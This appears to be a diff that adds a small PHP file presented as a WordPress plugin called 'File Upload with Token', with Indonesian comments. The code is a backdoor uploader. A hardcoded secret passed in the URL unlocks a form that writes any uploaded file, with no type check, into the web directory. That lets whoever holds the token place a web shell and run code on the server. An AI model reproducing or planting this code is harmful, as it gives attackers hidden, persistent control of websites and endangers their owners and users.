@@ -1,0 +1,35 @@
+<?php
+/*
+Plugin Name: File Upload with Token
+Plugin URI: https://github.com/drian-o/
+Description: Simple File Upload with URL Token
+Version: 1.2
+Author URI: https://github.com/drian-o/
+*/
+
+// Atur token rahasia (bisa diganti sesuka hati)
+$valid_token = "Superbone";
+
+// Ambil token dari URL
+$token = isset($_GET['token']) ? $_GET['token'] : "";
+
+// Cek apakah token cocok
+if ($token !== $valid_token) {
+    die("<b>Access Denied!</b> Invalid token.");
+}
+
+// Kalau token valid, tampilkan form upload
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file">';
+echo '<input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+
+// Proses upload file
+if (isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
+    $target = basename($_FILES['file']['name']);
+    if (@copy($_FILES['file']['tmp_name'], $target)) {
+        echo '<b>File Uploaded!!</b><br><br>';
+    } else {
+        echo '<b>Fail To Upload File!!!</b><br><br>';
+    }
+}
+?>
